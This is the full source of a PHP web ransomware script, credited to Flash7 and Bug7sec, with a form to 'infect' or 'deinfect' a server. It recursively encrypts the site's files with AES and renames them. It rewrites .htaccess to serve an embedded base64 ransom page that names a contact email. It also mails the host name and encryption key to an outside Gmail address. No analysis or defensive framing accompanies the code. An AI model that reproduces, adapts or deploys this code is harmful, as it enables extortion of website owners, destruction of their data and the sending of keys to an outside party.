 <!DOCTYPE html>
<html>
<head>
   <title>Hi ! Flash7</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{
    border-style: dotted;
    border-color: #379600;
    background-color: transparent;
    color: white;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: green;
    background-color: transparent;
    color: green;
}
.submite{
       border-style: dotted;
    border-color: #4CAF50;
    background-color: transparent;
    color: white;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htaFlash7")){
      rename(".htaccess", ".htaFlash7");
      if(fwrite(fopen('.htaccess', 'w'), "#Bug7sec Team - ReC0ded by : Flash7 - Original by : shor7cut \r\nDirectoryIndex Flash7.php\r\nErrorDocument 404 /Flash7.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("Flash7.php", base64_decode("PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KICAgPHRpdGxlPkhlbGxvIHNpcjwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KYm9keSB7DQogICAgYmFja2dyb3VuZDogIzFBMUMxRjsNCiAgICBjb2xvcjogI2UyZTJlMjsNCn0NCmF7DQogICBjb2xvcjpyZWQ7DQogICB0ZXh0LWRlY29yYXRpb246IG5vbmU7DQp9DQphOmhvdmVyew0KICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8cHJlPjxmb250IGNvbG9yPXJlZD4NCiAgX19fX19fX19fX19fX19fICAgICAgICAgIHwqXF8vKnxfX19fX19fXw0KIHwgIF9fX19fX19fX19fICB8ICAgICAgICB8fF8vLVxffF9fX19fXyAgfA0KIHwgfCAgID4gICA8ICAgfCB8ICAgICAgICB8IHwgICAwICAgPCAgIHwgfA0KIHwgfCAgICAgLSAgICAgfCB8ICAgICAgICB8IHwgICAgIC0gICAgIHwgfA0KIHwgfCAgIFxfX18vICAgfCB8ICAgICAgICB8IHwgICBcX19fLyAgIHwgfA0KIHxfX19fX3xcXy98X19fX198ICAgICAgICB8X19fX19fX19fX19fX19ffDwvZm9udD4NCiAgLyAqKioqKioqKioqIFwuLi4uLi4uLi4uLiAvICoqKioqKioqKiogXA0KLyAgKioqKioqKioqKioqICBcICAgICAgICAvICAqKioqKioqKioqKiogIFwNCi0tLS0tLS0tLS0tLS0tLS0tLS0tICAgICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0NCistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgIFsgPGEgaHJlZj0nbWFpbHRvOnVubG9ja3BhZ2UwMDFAZ21haWwuY29tJz51bmxvY2twYWdlMDAxQGdtYWlsLmNvbTwvYT4gXQ0KKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCnwgVGhpcyBwYWdlIGhhcyBiZWVuIExvY2tlZCAhIFJlYWQgbW9yZSBhYm91dCA8YSBocmVmPSJodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9SYW5zb213YXJlIiB0YXJnZXQ9Il9ibGFuayI+cmFuc29tZXdhcmU8L2E+IHwNCnwgSG93IHRvIHJlc3RvcmUgdGhlIGJlZ2lubmluZz8gICAgICAgfCsrKysrKysrKysrKysrKysrKyt8DQp8IFBsZWFzZSBjb250YWN0IHVzIHZpYSBlbWFpbCBsaXN0ZWQgIHwgICAgIEZsYXNoNyAgICB8DQorLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKw0KPC9wcmU+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4NCg==
"))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  Flash7.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){

      if( file_exists(".htaFlash7") ){
        if( unlink(".htaccess") && unlink("Flash7.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> Flash7.php (Default Page)<br>';
        }
        rename(".htaFlash7", ".htaccess");
      }

   }

   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"kewer.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"Flash7.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htaFlash7") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }

   public function report($key){
        $message.= "=========     Report Ransomware    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "  Key     : ".$key;
        $message.= "========= Indonesian (2017) Ransomware =========\n";
        $subject = "Report Ransomeware !";
        $headers = "From: Ransomware <ransomeware@Flash7.today>\r\n";
        mail("unlockpage001@gmail.com",$subject,$message,$headers);
   }

   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".Flash7");
        break;
        case '2':
          $locates = str_replace(".Flash7", "", $locate);
          rename($locate, $locates);
        break;
      }
   }

   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );

      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }

   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }



   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}

if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<center>
<pre>

            .-""-.
           / .--. \
          / /    \ \
          | |    | |
          | |.-""-.|
         ///`.::::.`\
        ||| ::/  \:: ;
        ||; ::\__/:: ;
         \\\ '::::' /
          `=':-..-'`
          
          WerkeWer

 -[ Contact : unlockpage001[at]gmail[dot]com ]-
</pre>
<form action="" method="post" style=" text-align: center;">
      <label>Key : </label>
      <input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC">
      <select name="method" class="selecte">
         <option value="1">Infection</option>
         <option value="2">DeInfection</option>
      </select>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>
</center>
<?php
}

?>
